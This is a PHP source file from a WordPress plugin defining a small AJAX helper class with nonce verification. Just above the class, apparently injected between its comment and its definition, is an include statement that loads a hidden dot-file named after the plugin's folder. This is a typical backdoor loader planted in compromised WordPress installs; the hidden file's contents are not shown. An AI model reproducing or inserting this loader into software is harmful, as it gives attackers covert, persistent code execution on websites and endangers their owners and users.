<?php


/**
 * Class Tribe__Ajax__Operations
 *
 * Handles common AJAX operations.
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Ajax__Operations {

	public function verify_or_exit( $nonce, $action, $exit_data = [] ) {
		if ( ! wp_verify_nonce( $nonce, $action ) ) {
			exit( $exit_data );
		}

		return true;
	}

	public function exit_data( $data = [] ) {
		exit( $data );
	}
}
